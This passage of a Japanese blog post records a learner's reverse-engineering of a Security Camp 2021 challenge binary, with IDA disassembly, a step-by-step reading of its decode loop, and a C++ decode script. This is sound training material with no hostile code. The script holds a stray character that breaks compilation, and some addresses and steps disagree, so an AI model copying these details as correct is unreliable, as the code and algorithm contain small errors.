class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%B5%A1%B3%A3%B8%EC&quot;&gt;機械語&lt;/a&gt;の対応などを勉強しました。主に参考したのは、以下の5つの文献です。&lt;br&gt;
(1)&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DE%A5%EB%A5%A6%A5%A7%A5%A2&quot;&gt;マルウェア&lt;/a&gt;解析&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C1%A5%E5%A1%BC%A5%C8%A5%EA%A5%A2%A5%EB&quot;&gt;チュートリアル&lt;/a&gt;＜&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%DE%A5%EB%A5%A6%A5%A7%A5%A2&quot;&gt;マルウェア&lt;/a&gt;解析のはじめかた編＞&lt;br&gt;
&lt;a href=&quot;https://www.mbsd.jp/research/20200910.html&quot;&gt;https://www.mbsd.jp/research/20200910.html&lt;/a&gt; &lt;br&gt;
(2)&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/x86-64&quot;&gt;x86-64&lt;/a&gt; 命令の概要&lt;br&gt;
&lt;a href=&quot;https://www.mztn.org/lxasm64/amd06_sum.html&quot;&gt;https://www.mztn.org/lxasm64/amd06_sum.html&lt;/a&gt;&lt;br&gt;
(3)&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Microsoft&quot;&gt;Microsoft&lt;/a&gt; System Services&lt;br&gt;
&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/api/_base/&quot;&gt;https://docs.microsoft.com/en-us/windows/win32/api/_base/&lt;/a&gt;&lt;br&gt;
(4)x64での呼び出し規則&lt;br&gt;
&lt;a href=&quot;https://docs.microsoft.com/ja-jp/cpp/build/x64-calling-convention?view=msvc-160&quot;&gt;https://docs.microsoft.com/ja-jp/cpp/build/x64-calling-convention?view=msvc-160&lt;/a&gt;&lt;br&gt;
(5)大熱血！&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%E9&quot;&gt;アセンブラ&lt;/a&gt;入門, 坂井弘亮&lt;br&gt;
&lt;br&gt;
　&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%E9&quot;&gt;アセンブラ&lt;/a&gt;入門は&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;と&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;の対応の雰囲気を知るために読みました。これらに加えて、IDA Freeware, x64dbg, ollydbg, VisualStudio, PEファイルの構造も少し勉強しましたが、実際に解析に役に立ったのはIDAのみでした。それでも、周辺知識が得られたのはとてもよかったです。 また、解析を通じて、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;コードをまとまりごとに読むことができるようになりました。&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%DF%A5%E5%A5%EC%A1%BC%A5%BF&quot;&gt;エミュレータ&lt;/a&gt;開発ではとにかく1つの命令に集中していたので視野が広がったと思います。同時に、「プログラムの実行時にmain()の前にどのような処理が行われるか」と「メモリにどのようにして実行コードがロードされるか」の2つの疑問も生じました。&lt;br&gt;
&lt;br&gt;
&amp;lt;解析の過程&gt;&lt;br&gt;
　&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/Windows&quot;&gt;Windows&lt;/a&gt;のバイナリの解析をしたことがなく、見当違いのことを勉強したり、バイナリの見当違いの箇所を調べたりしました。また、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;箇所の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;を読むのも、先頭から順当に進んだわけでなく、少しわかる箇所からよくわからない箇所の処理を推測したりしました。以下では、解析がどのように進展したか説明したいと思います。&lt;br&gt;
　まず、課題ファイルに書いてある通り、実行すると内部のデータがデコードされて”This_is_decoded_text”という文字列が表示された。次にファイルをIDAで開いてみたが、どこが&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;の処理なのかさっぱりわからなかった。IDAを眺めるうちに、FinfResourceW, SizeofResource, …, VirtualAllocといった関数を見つけ、それらがWindowsAPIの関数で、関数名や文献からデータ領域を確保するのだということがわかった。そして、その直後に確保したメモリアドレスやや”SECCAMP2021”というデータのアドレスや即値0x89192712を引数として、呼び出される関数があり、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;の処理ではないかとアタリをつけた。この関数の直後にMessageBox()を呼び出しているため、確証がもてた。&lt;br&gt;
　デコード本体の関数は、IDAで表示してみると単純なループの形になっているとわかった。&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;を読むと同時に、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D6%A5%EC%A1%BC%A5%AF%A5%DD%A5%A4%A5%F3%A5%C8&quot;&gt;ブレークポイント&lt;/a&gt;をうって、変数の値を確認しながら実行したりした。特に、デコード後のデータが格納されるであろう処理から遡ってデータを追うことで、それ以前の処理の予想を立てる方法が効率的だった。&lt;br&gt;
&lt;br&gt;
&amp;lt;解析レポート&gt;&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;1. デコード処理周辺&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　デコード本体の関数にDecodeFuncという名前をつけた。以下はDecodeFuncの呼び出し前後の逆&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EB&quot;&gt;アセンブル&lt;/a&gt;結果である。(IDAで表示した。)&lt;br&gt;&lt;/p&gt;

&lt;pre class=&quot;code lang-asm&quot; data-lang=&quot;asm&quot; data-unlink&gt;&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11CA&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;call&lt;/span&gt;    &lt;span class=&quot;synIdentifier&quot;&gt;cs&lt;/span&gt;:&lt;span class=&quot;synIdentifier&quot;&gt;VirtualAlloc&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11D0&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     [&lt;span class=&quot;synIdentifier&quot;&gt;rsp&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;h&lt;/span&gt;+&lt;span class=&quot;synIdentifier&quot;&gt;dataAddr&lt;/span&gt;], &lt;span class=&quot;synIdentifier&quot;&gt;rax&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11D5&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;ptr&lt;/span&gt; [&lt;span class=&quot;synIdentifier&quot;&gt;rsp&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;h&lt;/span&gt;+&lt;span class=&quot;synIdentifier&quot;&gt;ResSize&lt;/span&gt;]
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11D9&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;rdi&lt;/span&gt;, [&lt;span class=&quot;synIdentifier&quot;&gt;rsp&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;h&lt;/span&gt;+&lt;span class=&quot;synIdentifier&quot;&gt;dataAddr&lt;/span&gt;] &lt;span class=&quot;synComment&quot;&gt;; rdi=valloc()&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11DE&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;rsi&lt;/span&gt;, [&lt;span class=&quot;synIdentifier&quot;&gt;rsp&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;h&lt;/span&gt;+&lt;span class=&quot;synIdentifier&quot;&gt;ResAddr&lt;/span&gt;]
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11E3&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;ecx&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11E5&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;rep&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;movsb&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11E7&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     [&lt;span class=&quot;synIdentifier&quot;&gt;rsp&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;h&lt;/span&gt;+&lt;span class=&quot;synIdentifier&quot;&gt;hex0B&lt;/span&gt;], &lt;span class=&quot;synConstant&quot;&gt;0B&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;h&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11EF&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;r9&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;aSeccamp2021&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11F6&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;r8&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;cs&lt;/span&gt;:&lt;span class=&quot;synIdentifier&quot;&gt;_89192712h&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A11FD&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;edx&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;ptr&lt;/span&gt; [&lt;span class=&quot;synIdentifier&quot;&gt;rsp&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;h&lt;/span&gt;+&lt;span class=&quot;synIdentifier&quot;&gt;ResSize&lt;/span&gt;]
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A1201&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;rcx&lt;/span&gt;, [&lt;span class=&quot;synIdentifier&quot;&gt;rsp&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;h&lt;/span&gt;+&lt;span class=&quot;synIdentifier&quot;&gt;dataAddr&lt;/span&gt;]
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A1206&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;call&lt;/span&gt;    &lt;span class=&quot;synIdentifier&quot;&gt;DecodeFunc&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A120B&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;xor&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;r9d&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;r9d&lt;/span&gt;        &lt;span class=&quot;synComment&quot;&gt;; uType&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A120E&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;r8&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;TitleStr&lt;/span&gt;    &lt;span class=&quot;synComment&quot;&gt;; &amp;quot;Decode!!&amp;quot;&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A1215&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;rdx&lt;/span&gt;, [&lt;span class=&quot;synIdentifier&quot;&gt;rsp&lt;/span&gt;+&lt;span class=&quot;synConstant&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;h&lt;/span&gt;+&lt;span class=&quot;synIdentifier&quot;&gt;dataAddr&lt;/span&gt;] &lt;span class=&quot;synComment&quot;&gt;; lpText&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A121A&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;xor&lt;/span&gt;     &lt;span class=&quot;synIdentifier&quot;&gt;ecx&lt;/span&gt;, &lt;span class=&quot;synIdentifier&quot;&gt;ecx&lt;/span&gt;        &lt;span class=&quot;synComment&quot;&gt;; hWnd&lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;00007&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;FF6959A121C&lt;/span&gt;                 &lt;span class=&quot;synIdentifier&quot;&gt;call&lt;/span&gt;    &lt;span class=&quot;synIdentifier&quot;&gt;cs&lt;/span&gt;:&lt;span class=&quot;synIdentifier&quot;&gt;MessageBoxA&lt;/span&gt;
&lt;/pre&gt;


&lt;p&gt;　MessageBoxAでデコード後のテキストが表示される。そのため、MessageBoxAの引数を見れば、デコード後のデータはdataAddrというアドレスにあることがわかる。raxは戻り値を保持する&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%EC%A5%B8%A5%B9%A5%BF&quot;&gt;レジスタ&lt;/a&gt;なのでdataAddrはvirtualAllocで確保されたメモリ領域であることもわかる。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;2.&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;処理&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;　&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;本体は0x00007FF6959A1000から始まる。(1)~(10)に分けて&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%BB%A5%F3%A5%D6%A5%EA&quot;&gt;アセンブリ&lt;/a&gt;を読んだ&lt;br&gt;
&lt;br&gt;
(1)00007FF6959A1000~00007FF6959A101E&lt;br&gt;
引数をローカル変数に格納する処理が行われる。ローカル変数は以下のようにセットされる。&lt;br&gt;
campAddr = テキストデータ”SECCAMP2021”のアドレス&lt;br&gt;
key = 鍵となる数値。初めは、0x89192712がセットされる&lt;br&gt;
resSize = &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;されたデータのサイズ(ビット数)&lt;br&gt;
dataAddr = &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;されたデータのアドレス&lt;br&gt;
cnt = 0 ループのためのカウンタ変数&lt;br&gt;
&lt;br&gt;
(2)00007FF6959A1020~00007FF6959A1025&lt;br&gt;
cntをインクリメントする。&lt;br&gt;
&lt;br&gt;
(3)00007FF6959A1028~00007FF6959A102F&lt;br&gt;
ループの継続条件を判断するものである。cntとresSizeを比較しており、以下のコードに相当する&lt;br&gt;
for(; cnt &amp;lt; resSize; ++i){&lt;br&gt;
    //process&lt;br&gt;
}&lt;br&gt;
&lt;br&gt;
(4)00007FF6959A1035~00007FF6959A104B&lt;br&gt;
keyに数学的操作を施す処理である。keyを5倍して0x2365f703を足す。&lt;br&gt;
&lt;br&gt;
(5)00007FF6959A1050~00007FF6959A109E&lt;br&gt;
jle命令とjge命令があるが、これらは以下の条件分岐に対応する。&lt;br&gt;
&lt;br&gt;
eax = [cnt + dataAddr] -1;&lt;br&gt;
if(0xa0 &amp;lt; eax &amp;amp;&amp;amp; eax &amp;lt; 0xff){&lt;br&gt;
    …...&lt;br&gt;
}&lt;br&gt;
この処理が&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;においてどのような意味をなすのかはわからなかった。&lt;br&gt;
&lt;br&gt;
(6)00007FF6959A10A1~00007FF6959A10BD&lt;br&gt;
&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;されたデータから1ビットだけとりだす操作である。デコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8&quot;&gt;スクリプト&lt;/a&gt;を書いたときは、この&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;する前のデータから’This_is_decoded_text’を生成することを目指した。&lt;br&gt;
&lt;br&gt;
(7)00007FF6959A10C0~00007FF6959A10BD&lt;br&gt;
keyに数学的操作を施す処理である。2ビットだけ右に算術シフトして0x1ca9を減じる。&lt;br&gt;
&lt;br&gt;
(8)00007FF6959A10EF~00007FF6959A1123&lt;br&gt;
処理が煩雑だったため読み飛ばしたが、結局、’S’&lt;em&gt;2→’E’&lt;/em&gt;2→’C’*2→...の順でビットを得ていることが確認できた。&lt;br&gt;
&lt;br&gt;
(9)00007FF6959A1125~00007FF6959A1143&lt;br&gt;
xorなどの演算を行い、addrDataに&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;後のデータを格納する。&lt;br&gt;
&lt;br&gt;
(10)00007FF6959A1148~00007FF6959A114C&lt;br&gt;
ループから抜ける処理である。&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h4&gt;3.デコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;/デコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8&quot;&gt;スクリプト&lt;/a&gt;と&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;&lt;br&gt;&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;
3-1.デコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;&lt;br&gt;
デコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A2%A5%EB%A5%B4%A5%EA%A5%BA%A5%E0&quot;&gt;アルゴリズム&lt;/a&gt;は以下のとおりである。&lt;br&gt;
&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A8%A5%F3%A5%B3%A1%BC%A5%C9&quot;&gt;エンコード&lt;/a&gt;されたデータを変数S、文字列”SECCAMP2021”を変数Tで表す。&lt;br&gt;
1.鍵keyとなる数値0x89192712を用意し、これを変数keyとする。&lt;br&gt;
2.Sのi番目のビットに対して、2~6を繰り返す。(i=0からi=len(S)まで)&lt;br&gt;
3.keyに数学的操作を施す。(5倍して0x2365f703を足す)&lt;br&gt;
4.S[i] = S[i] xor key&lt;br&gt;
5.keyに数学的操作を施す。(2ビットだけ右に算術シフトして0x1ca9を減じる)&lt;br&gt;
6.S[i] = S[i] xor (T[i%11] + key)&lt;br&gt;
7.S[i]はデコードされたデータである。&lt;br&gt;
&lt;br&gt;
3-2.デコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8&quot;&gt;スクリプト&lt;/a&gt;&lt;br&gt;&lt;/p&gt;

&lt;pre class=&quot;code lang-cpp&quot; data-lang=&quot;cpp&quot; data-unlink&gt;&lt;span class=&quot;synPreProc&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;
&lt;span class=&quot;synPreProc&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;&amp;lt;cstdio&amp;gt;&lt;/span&gt;
&lt;span class=&quot;synPreProc&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;
&lt;span class=&quot;synPreProc&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;namespace&lt;/span&gt; std;

&lt;span class=&quot;synType&quot;&gt;uint64_t&lt;/span&gt; sar2(&lt;span class=&quot;synType&quot;&gt;uint64_t&lt;/span&gt; v){
    &lt;span class=&quot;synType&quot;&gt;uint64_t&lt;/span&gt; ret = v &amp;gt;&amp;gt; &lt;span class=&quot;synConstant&quot;&gt;2&lt;/span&gt;;
    ret += (v &amp;amp; &lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;) &amp;lt;&amp;lt; &lt;span class=&quot;synConstant&quot;&gt;62&lt;/span&gt;;
    &lt;span class=&quot;synStatement&quot;&gt;return&lt;/span&gt; ret;
}

string decode(string s){
    string t = &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;SECCAMP2021&amp;quot;&lt;/span&gt;;
    &lt;span class=&quot;synType&quot;&gt;uint8_t&lt;/span&gt; lent = t.length();
    &lt;span class=&quot;synType&quot;&gt;uint8_t&lt;/span&gt; lens = s.length();
    &lt;span class=&quot;synType&quot;&gt;uint8_t&lt;/span&gt; sarr[&lt;span class=&quot;synConstant&quot;&gt;100&lt;/span&gt;], tarr[&lt;span class=&quot;synConstant&quot;&gt;100&lt;/span&gt;];

    &lt;span class=&quot;synType&quot;&gt;uint64_t&lt;/span&gt; key = &lt;span class=&quot;synConstant&quot;&gt;0x89192712&lt;/span&gt;;

    &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;; i &amp;lt; lens; ++i){
        sarr[i] = s[i];
        tarr[i] = t[i];
        &lt;span class=&quot;synComment&quot;&gt;//3&lt;/span&gt;
        key = key * &lt;span class=&quot;synConstant&quot;&gt;5&lt;/span&gt; + &lt;span class=&quot;synConstant&quot;&gt;0x2365f703&lt;/span&gt;;

        &lt;span class=&quot;synStatement&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;0xa0&lt;/span&gt; &amp;lt; sarr[i] &amp;amp;&amp;amp; sarr[i] &amp;lt; &lt;span class=&quot;synConstant&quot;&gt;0xff&lt;/span&gt;) sarr[i]--;

        &lt;span class=&quot;synComment&quot;&gt;//4&lt;/span&gt;
        sarr[i] = sarr[i] ^ (key &amp;amp; &lt;span class=&quot;synConstant&quot;&gt;0xff&lt;/span&gt;);

        &lt;span class=&quot;synComment&quot;&gt;//5&lt;/span&gt;
        key = sar2(key) - &lt;span class=&quot;synConstant&quot;&gt;0x1ca9&lt;/span&gt;;c

        &lt;span class=&quot;synComment&quot;&gt;//6&lt;/span&gt;
        &lt;span class=&quot;synType&quot;&gt;uint64_t&lt;/span&gt; tmp = (key + tarr[i%lent] * &lt;span class=&quot;synConstant&quot;&gt;2&lt;/span&gt;);
        sarr[i] = sarr[i] ^ (tmp &amp;amp; &lt;span class=&quot;synConstant&quot;&gt;0xff&lt;/span&gt;);
    }
    &lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;; i &amp;lt; lens; ++i){s[i] = sarr[i];}

    &lt;span class=&quot;synStatement&quot;&gt;return&lt;/span&gt; s;
}

&lt;span class=&quot;synType&quot;&gt;int&lt;/span&gt; main(){
    string s = &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\x8d\x93\x13\x8a\x43\xb6\x59\x4d\x41\x80\x1b\x53\x02\x86\xf2\xed\x55\x55\x78\x59\x8b\x77\x35\x17\x56&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;;
    
    cout &amp;lt;&amp;lt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;s         = &amp;quot;&lt;/span&gt; &amp;lt;&amp;lt; s &amp;lt;&amp;lt; endl;
    cout &amp;lt;&amp;lt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;decode   -&amp;gt; &amp;quot;&lt;/span&gt; &amp;lt;&amp;lt; decode(s) &amp;lt;&amp;lt; endl;
    cout &amp;lt;&amp;lt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;decode*2 -&amp;gt; &amp;quot;&lt;/span&gt; &amp;lt;&amp;lt; decode(decode(s)) &amp;lt;&amp;lt; endl;

    &lt;span class=&quot;synStatement&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;;
}
&lt;/pre&gt;


&lt;p&gt;&lt;br&gt;
3-3.デコード&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B9%A5%AF%A5%EA%A5%D7%A5%C8&quot;&gt;スクリプト&lt;/a&gt;の実行結果&lt;br&gt;&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;$ ./a.out
